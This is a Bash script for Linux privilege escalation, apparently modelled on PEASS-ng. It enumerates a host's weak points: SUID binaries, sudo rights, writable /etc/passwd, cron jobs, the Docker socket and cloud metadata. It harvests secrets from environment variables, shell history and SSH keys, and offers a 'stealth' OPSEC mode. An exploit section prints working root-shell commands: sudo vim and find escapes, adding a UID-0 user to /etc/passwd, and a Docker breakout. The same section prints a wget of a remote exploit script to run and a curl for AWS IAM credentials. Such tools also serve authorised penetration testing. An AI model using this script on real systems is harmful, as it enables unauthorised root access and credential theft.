#!/bin/bash

#############################################################################
#                                                                           #
#  LINUX PRIVILEGE ESCALATION CHECKER                                        #
#  PEASS-ng Inspired Professional Edition                                    #
#                                                                           #
#  Features:                                                                 #
#  - Modular architecture (system, suid, capabilities, cron, etc.)          #
#  - Color-coded output with severity levels                                 #
#  - JSON output support                                                     #
#  - Stealth mode for OPSEC                                                  #
#  - Cloud & container detection                                             #
#  - Exploit suggestions & Metasploit integration                            #
#  - Backward compatible with existing privesc.sh                           #
#                                                                           #
#############################################################################

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPORT_DIR="${SCRIPT_DIR}/../../reports"
mkdir -p "$REPORT_DIR"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_FORMAT="text"
STEALTH_MODE=false
VERBOSE=false
QUICK_MODE=false
REPORT_FILE=""

FINDINGS=()
EXPLOITS=()
CVES=()

banner() {
    echo ""
    echo -e "${CYAN}─────── LINUX PRIVILEGE ESCALATION CHECKER ───────"
    echo -e "─────── PEASS-ng Inspired Professional Edition ───────${NC}"
    echo ""
}

usage() {
    cat << EOF
USAGE: $0 [OPTIONS]

OPTIONS:
    -o, --output FILE      Save report to file
    -a, --all              Run all checks (default)
    -s, --system           System info, sudo, kernel only
    -u, --users            Users, sudo, capabilities only
    -p, --perms            SUID, SGID, capabilities only
    -c, --cron             Cron jobs only
    -n, --network          Network and process analysis only
    --quick                Quick scan (high priority only)
    --json                 Output in JSON format
    --stealth              Stealth mode (no colors, no files)
    --verbose              Verbose output
    -h, --help             Show this help

EXAMPLES:
    # Full scan with report
    $0 -o privesc_report.txt

    # Quick scan
    $0 --quick

    # JSON output for automation
    $0 --json > results.json

    # Stealth mode (OPSEC)
    $0 --stealth

    # System info and kernel checks
    $0 -s

    # SUID/SGID analysis
    $0 -p

EOF
}

log_info() {
    echo -e "${BLUE}[*]${NC} $1"
    [[ -n "$REPORT_FILE" ]] && echo "[*] $1" >> "$REPORT_FILE"
}

log_good() {
    echo -e "${GREEN}[+]${NC} $1"
    [[ -n "$REPORT_FILE" ]] && echo "[+] $1" >> "$REPORT_FILE"
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1"
    [[ -n "$REPORT_FILE" ]] && echo "[!] $1" >> "$REPORT_FILE"
}

log_critical() {
    echo -e "${RED}[CRITICAL]${NC} $1"
    [[ -n "$REPORT_FILE" ]] && echo "[CRITICAL] $1" >> "$REPORT_FILE"
}

log_high() {
    echo -e "${RED}[HIGH]${NC} $1"
    [[ -n "$REPORT_FILE" ]] && echo "[HIGH] $1" >> "$REPORT_FILE"
}

section() {
    echo ""
    if [[ "$STEALTH_MODE" == "false" ]]; then
        echo ""
        echo -e "${CYAN}─────── $1 ───────"
    else
        echo "=== $1 ==="
    fi
    echo ""
    [[ -n "$REPORT_FILE" ]] && echo "" >> "$REPORT_FILE"
}

json_add_finding() {
    local type="$1"
    local severity="$2"
    local title="$3"
    local description="$4"
    local exploit="$5"
    FINDINGS+=("{\"type\":\"$type\",\"severity\":\"$severity\",\"title\":\"$title\",\"description\":\"$description\",\"exploit\":\"$exploit\"}")
}

json_add_exploit() {
    local name="$1"
    local cve="$2"
    local platform="$3"
    local link="$4"
    EXPLOITS+=("{\"name\":\"$name\",\"cve\":\"$cve\",\"platform\":\"$platform\",\"link\":\"$link\"}")
}

json_output() {
    local timestamp=$(date -Iseconds)
    echo "{"
    echo "  \"timestamp\": \"$timestamp\","
    echo "  \"os\": \"$(uname -a)\","
    echo "  \"user\": \"$(whoami)\","
    echo "  \"findings\": ["
    local first=true
    for finding in "${FINDINGS[@]}"; do
        if [[ "$first" == "true" ]]; then
            first=false
        else
            echo ","
        fi
        echo -n "    $finding"
    done
    echo ""
    echo "  ],"
    echo "  \"exploits\": ["
    first=true
    for exploit in "${EXPLOITS[@]}"; do
        if [[ "$first" == "true" ]]; then
            first=false
        else
            echo ","
        fi
        echo -n "    $exploit"
    done
    echo ""
    echo "  ]"
    echo "}"
}

check_system_info() {
    section "SYSTEM INFORMATION"
    
    log_info "Hostname: $(hostname)"
    log_info "OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"')"
    log_info "Kernel: $(uname -r)"
    log_info "Architecture: $(uname -m)"
    log_info "Current User: $(whoami) (UID: $(id -u))"
    log_info "Groups: $(id -Gn)"
    
    if [[ -f /.dockerenv ]] || grep -q docker /proc/1/cgroup 2>/dev/null; then
        log_warn "Running inside Docker container!"
        json_add_finding "container" "info" "Docker container detected" "System is containerized" "N/A"
    fi
    
    if [[ -d /proc/vz ]] || grep -q "qemu\|kvm" /proc/cpuinfo 2>/dev/null; then
        log_info "Running inside virtual machine"
    fi
}

check_sudo_version() {
    section "SUDO VERSION"
    
    if command -v sudo >/dev/null 2>&1; then
        local sudo_version=$(sudo -V 2>/dev/null | grep "Sudo ver")
        log_info "Sudo version: $sudo_version"
        
        if echo "$sudo_version" | grep -qE "1\.(8|9)\.[0-9]"; then
            log_warn "Potentially vulnerable sudo version"
            log_info "CVE-2021-3156 (Baron Samedit) may be exploitable"
            json_add_finding "sudo" "high" "Vulnerable sudo version" "Version may be vulnerable to CVE-2021-3156" "https://www.exploit-db.com/exploits/49921"
        fi
    else
        log_info "sudo not found"
    fi
}

check_kernel_cve() {
    section "KERNEL CVE CHECK"
    
    local kernel=$(uname -r)
    log_info "Kernel: $kernel"
    
    if [[ "$kernel" =~ ^4\.(0|1|2|3|4|5|6|7|8|9)\. ]] || [[ "$kernel" =~ ^3\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19)\. ]]; then
        log_high "Old kernel - check for known exploits"
        log_info "Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester"
    fi
}

check_sudo_l() {
    section "SUDO PRIVILEGES"
    
    if sudo -l 2>/dev/null | grep -q "may run the following commands"; then
        log_good "User has sudo privileges!"
        sudo -l 2>/dev/null | grep -v "may run" | head -20
        
        if sudo -l 2>/dev/null | grep -qi "NOPASSWD"; then
            log_critical "Passwordless sudo detected!"
            json_add_finding "sudo" "critical" "Passwordless sudo" "User can run commands without password" "N/A"
        fi
        
        if sudo -l 2>/dev/null | grep -qiE "(nmap|vim|find|bash|sh|perl|python)"; then
            log_high "Dangerous commands available via sudo!"
            json_add_finding "sudo" "high" "Dangerous sudo commands" "Commands that can lead to root" "N/A"
        fi
    else
        log_warn "No sudo privileges"
    fi
}

check_users() {
    section "USER ENUMERATION"
    
    log_info "Users with UID 0 (root):"
    awk -F: '($3 == 0) {print}' /etc/passwd
    
    log_info "Users with shell access:"
    awk -F: '($7 != "/usr/sbin/nologin" && $7 != "/sbin/nologin") {print $1}' /etc/passwd | head -20
}

check_suid_binaries() {
    section "SUID BINARIES"
    
    log_info "Searching for SUID binaries..."
    
    local dangerous=("nmap" "vim" "vi" "find" "bash" "sh" "perl" "python" "python3" "ruby" "gcc" "make" "awk" "gawk" "mawk")
    
    find / -perm -4000 -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | while read -r suid; do
        local basename=$(basename "$suid")
        
        for danger in "${dangerous[@]}"; do
            if [[ "$basename" == "$danger" ]]; then
                log_high "Dangerous SUID binary: $suid"
                log_info "GTFOBins: https://gtfobins.github.io/gtfobins/$basename"
                json_add_finding "suid" "high" "Dangerous SUID: $basename" "$suid" "https://gtfobins.github.io/gtfobins/$basename"
                break
            fi
        done
    done
    
    log_info "Total SUID binaries found: $(find / -perm -4000 -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | wc -l)"
}

check_sgid_binaries() {
    section "SGID BINARIES"
    
    log_info "Searching for SGID binaries..."
    find / -perm -2000 -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -20
    
    log_info "Total SGID binaries found: $(find / -perm -2000 -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | wc -l)"
}

check_capabilities() {
    section "LINUX CAPABILITIES"
    
    if command -v getcap >/dev/null 2>&1; then
        log_info "Files with capabilities:"
        getcap -r / 2>/dev/null | grep -v "^/" | head -30
        
        local dangerous=$(getcap -r / 2>/dev/null | grep -iE "cap_setuid|cap_sys_admin|cap_dac_override")
        if [[ -n "$dangerous" ]]; then
            log_high "Dangerous capabilities found:"
            echo "$dangerous"
            json_add_finding "capabilities" "high" "Dangerous capabilities" "$dangerous" "N/A"
        fi
    else
        log_warn "getcap not available"
    fi
}

check_cron_jobs() {
    section "CRON JOBS"
    
    log_info "System crontab:"
    cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" | head -10 || log_warn "Cannot read crontab"
    
    log_info "Cron directories:"
    ls -la /etc/cron* 2>/dev/null
    
    log_info "Writable cron directories:"
    find /etc/cron* -type d -writable 2>/dev/null | while read -r dir; do
        log_high "Writable: $dir"
        json_add_finding "cron" "high" "Writable cron directory" "$dir" "Add malicious cron job"
    done
    
    if grep -q "no_root_squash" /etc/exports 2>/dev/null; then
        log_high "NFS no_root_squash detected!"
        json_add_finding "nfs" "high" "NFS no_root_squash" "Can create SUID on NFS share" "N/A"
    fi
}

check_path() {
    section "PATH CONFIGURATION"
    
    log_info "Current PATH: $PATH"
    
    IFS=':' read -ra PATHS <<< "$PATH"
    for dir in "${PATHS[@]}"; do
        if [[ -w "$dir" ]]; then
            log_high "Writable PATH directory: $dir"
            json_add_finding "path" "high" "Writable PATH directory" "$dir" "N/A"
        fi
    done
    
    if [[ "$PATH" =~ (^|:)\.(:|$) ]]; then
        log_critical "Current directory in PATH!"
        json_add_finding "path" "critical" "Dot in PATH" "." "N/A"
    fi
}

check_network() {
    section "NETWORK CONFIGURATION"
    
    log_info "Network interfaces:"
    ip addr 2>/dev/null | head -10 || ifconfig -a 2>/dev/null | head -10
    
    log_info "Listening ports:"
    ss -tulpn 2>/dev/null | grep LISTEN | head -10 || netstat -tulpn 2>/dev/null | grep LISTEN | head -10
    
    log_info "ARP table:"
    ip neigh 2>/dev/null | head -10 || arp -a 2>/dev/null | head -10
}

check_sensitive_files() {
    section "SENSITIVE FILES"
    
    if [[ -r /etc/shadow ]]; then
        log_critical "/etc/shadow is readable!"
        json_add_finding "shadow" "critical" "/etc/shadow readable" "Password hashes accessible" "N/A"
    fi
    
    log_info "SSH keys:"
    find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | head -10
    
    log_info "Environment variables with secrets:"
    env 2>/dev/null | grep -iE "(password|secret|token|key)" | head -10 || log_info "No obvious secrets in environment"
    
    log_info "History files:"
    cat ~/.bash_history 2>/dev/null | grep -iE "(password|secret|su |mysql|ssh)" | tail -20 || log_info "No history available"
}

check_docker() {
    section "CONTAINER DETECTION"
    
    if [[ -f /.dockerenv ]] || grep -q docker /proc/1/cgroup 2>/dev/null; then
        log_warn "Running inside Docker container"
        
        if [[ -S /var/run/docker.sock ]]; then
            log_critical "Docker socket exposed!"
            json_add_finding "docker" "critical" "Docker socket exposed" "Container breakout possible" "N/A"
            log_info "Exploitation: docker run -v /:/host alpine chroot /host"
        fi
        
        if groups 2>/dev/null | grep -q docker; then
            log_high "User in docker group"
            json_add_finding "docker" "high" "Docker group membership" "Can use Docker for escape" "N/A"
        fi
    fi
}

check_cloud() {
    section "CLOUD METADATA"
    
    if curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1; then
        log_high "AWS EC2 metadata accessible!"
        json_add_finding "cloud" "high" "AWS metadata accessible" "Can retrieve IAM credentials" "N/A"
        log_info "Try: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    fi
    
    if curl -s --connect-timeout 2 -H "Metadata: true" http://169.254.169.254/metadata/instance >/dev/null 2>&1; then
        log_high "Azure metadata accessible!"
        json_add_finding "cloud" "high" "Azure metadata accessible" "Can retrieve instance metadata" "N/A"
    fi
}

check_processes() {
    section "PROCESS ANALYSIS"
    
    log_info "Processes running as root:"
    ps aux 2>/dev/null | grep "^root" | head -10
    
    log_info "Deleted binaries still running:"
    for pid in /proc/[0-9]*; do
        if [[ -L "$pid/exe" ]] && readlink "$pid/exe" 2>/dev/null | grep -q deleted; then
            log_warn "Deleted binary running: $pid"
        fi
    done
}

check_writable() {
    section "WRITABLE DIRECTORIES"
    
    log_info "World-writable directories:"
    find / -type d -writable 2>/dev/null | grep -v proc | grep -v sys | head -20
    
    log_info "Writable /etc files:"
    if [[ -w /etc/passwd ]]; then
        log_high "/etc/passwd is writable!"
        json_add_finding "passwd" "critical" "/etc/passwd writable" "Can add root user" "N/A"
    fi
    
    if [[ -w /etc/sudoers ]]; then
        log_high "/etc/sudoers is writable!"
        json_add_finding "sudoers" "critical" "/etc/sudoers writable" "Can give root sudo" "N/A"
    fi
}

quick_scan() {
    section "QUICK PRIVILEGE ESCALATION SCAN"
    
    log_info "Checking high-priority vectors..."
    
    if sudo -l 2>/dev/null | grep -qi "NOPASSWD"; then
        log_critical "Passwordless sudo detected!"
    fi
    
    if [[ -w /etc/passwd ]]; then
        log_critical "/etc/passwd is writable!"
    fi
    
    if [[ -r /etc/shadow ]]; then
        log_critical "/etc/shadow is readable!"
    fi
    
    find / -perm -4000 -type f 2>/dev/null | while read -r suid; do
        basename=$(basename "$suid")
        if [[ "$basename" =~ ^(nmap|vim|find|bash|sh|perl|python|ruby|gcc|make)$ ]]; then
            log_high "Dangerous SUID: $suid"
        fi
    done
    
    if [[ -S /var/run/docker.sock ]]; then
        log_high "Docker socket exposed!"
    fi
    
    curl -s --connect-timeout 1 http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1 && log_high "Cloud metadata accessible!"
}

show_exploits() {
    section "EXPLOIT SUGGESTIONS"
    
    log_info "Quick exploitation commands:"
    echo ""
    log_info "If you have sudo nmap:"
    echo "  sudo nmap --interactive"
    echo "  nmap> !sh"
    echo ""
    log_info "If you have sudo vim:"
    echo "  sudo vim -c ':!sh'"
    echo ""
    log_info "If you have sudo find:"
    echo "  sudo find . -exec /bin/sh \; -quit"
    echo ""
    log_info "If you have SUID bash:"
    echo "  /bin/bash -p"
    echo ""
    log_info "If /etc/passwd is writable:"
    echo "  echo 'root2:\$1\$salt\$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
    echo "  su root2"
    echo ""
    log_info "Kernel exploits:"
    echo "  wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/les.sh"
    echo "  ./les.sh"
    echo ""
    log_info "Metasploit:"
    echo "  use post/multi/recon/local_exploit_suggester"
}

generate_summary() {
    section "SUMMARY"
    
    log_info "Scan completed at: $(date)"
    [[ -n "$REPORT_FILE" ]] && log_info "Report saved to: $REPORT_FILE"
    
    echo ""
    log_info "Priority actions:"
    echo "  1. Check sudo privileges (sudo -l)"
    echo "  2. Check SUID binaries for exploits (GTFOBins)"
    echo "  3. Check for writable critical files (/etc/passwd, /etc/shadow)"
    echo "  4. Check cron jobs for wildcard injection"
    echo "  5. Check for container escape paths"
    echo "  6. Run Linux Exploit Suggester"
    echo ""
}

main() {
    local mode="all"
    local output=""
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -o|--output)
                output="$2"
                shift 2
                ;;
            -a|--all)
                mode="all"
                shift
                ;;
            -s|--system)
                mode="system"
                shift
                ;;
            -u|--users)
                mode="users"
                shift
                ;;
            -p|--perms)
                mode="perms"
                shift
                ;;
            -c|--cron)
                mode="cron"
                shift
                ;;
            -n|--network)
                mode="network"
                shift
                ;;
            --quick)
                QUICK_MODE=true
                shift
                ;;
            --json)
                OUTPUT_FORMAT="json"
                shift
                ;;
            --stealth)
                STEALTH_MODE=true
                shift
                ;;
            --verbose)
                VERBOSE=true
                shift
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Unknown option: $1${NC}"
                usage
                exit 1
                ;;
        esac
    done
    
    if [[ -n "$output" ]]; then
        REPORT_FILE="$output"
        echo "Linux Privilege Escalation Check Report" > "$REPORT_FILE"
        echo "Generated: $(date)" >> "$REPORT_FILE"
        echo "======================================" >> "$REPORT_FILE"
        echo "" >> "$REPORT_FILE"
    fi
    
    if [[ "$OUTPUT_FORMAT" != "json" ]]; then
        banner
        log_info "Starting privilege escalation checks..."
        echo ""
    fi
    
    case "$mode" in
        all)
            check_system_info
            check_users
            check_sudo_version
            check_sudo_l
            check_path
            check_suid_binaries
            check_sgid_binaries
            check_capabilities
            check_cron_jobs
            check_network
            check_sensitive_files
            check_processes
            check_writable
            check_docker
            check_cloud
            [[ "$QUICK_MODE" == "false" ]] && show_exploits
            ;;
        system)
            check_system_info
            check_sudo_version
            check_kernel_cve
            check_path
            ;;
        users)
            check_users
            check_sudo_l
            check_capabilities
            ;;
        perms)
            check_suid_binaries
            check_sgid_binaries
            check_capabilities
            check_writable
            ;;
        cron)
            check_cron_jobs
            ;;
        network)
            check_network
            check_processes
            check_docker
            check_cloud
            ;;
    esac
    
    if [[ "$QUICK_MODE" == "true" ]]; then
        quick_scan
    fi
    
    if [[ "$OUTPUT_FORMAT" == "json" ]]; then
        json_output
    else
        generate_summary
        [[ -n "$REPORT_FILE" ]] && log_info "Report saved to: $REPORT_FILE"
    fi
}

main "$@"
